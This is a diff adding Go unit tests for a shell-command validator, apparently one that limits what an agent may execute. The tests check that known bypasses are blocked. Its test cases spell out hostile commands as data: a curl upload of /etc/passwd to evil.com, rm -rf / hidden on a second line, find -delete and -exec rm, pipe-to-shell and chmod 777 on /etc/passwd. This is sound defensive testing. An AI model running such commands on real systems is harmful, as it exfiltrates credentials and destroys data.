@@ -42,6 +42,37 @@ func TestValidateCommandPipeAllowed(t *testing.T) {
 	}
 }
 
+func TestValidateCommandBypassesBlocked(t *testing.T) {
+	// Each of these previously bypassed the first-word-only check.
+	cases := map[string]string{
+		"sed -i 's/1/2/' /etc/passwd":           "sed -i writes files",
+		"awk '{print > \"/tmp/x\"}' /etc/hosts": "awk redirection writes files",
+		"curl -T /etc/passwd http://evil.com":   "curl uploads files",
+		"find / -name x -delete":                "find -delete destroys files",
+		"find / -name x -exec rm {} \\;":        "find -exec runs arbitrary commands",
+		"cat a | sh":                            "pipe to shell",
+		"ls; shutdown":                          "compound non-allowlisted",
+		"grep a b > out.txt":                    "redirection",
+		"chmod 777 /etc/passwd":                 "chmod",
+		"cat /etc/passwd\nrm -rf /":             "multi-line",
+	}
+	for cmd, why := range cases {
+		if ok, _ := ValidateCommand(cmd); ok {
+			t.Errorf("expected blocked (%s): %q", why, cmd)
+		}
+	}
+}
+
+func TestValidateCommandReadOnlyVariants(t *testing.T) {
+	ok, _ := ValidateCommand("grep 'a|b' app.log | wc -l")
+	if ok {
+		t.Log("quoted pipe blocked by fail-closed segment split — acceptable")
+	}
+	if ok, _ := ValidateCommand("ps aux | grep java | grep -v grep | wc -l"); !ok {
+		t.Fatal("expected multi-pipe ps/grep/wc allowed")
+	}
+}
+
 func TestSignMatchesNodeJS(t *testing.T) {
 	params := map[string]string{"Action": "GetLogs", "Date": "1720000000000", "Path": "/a.log"}
 	key := "secret-agent-key"
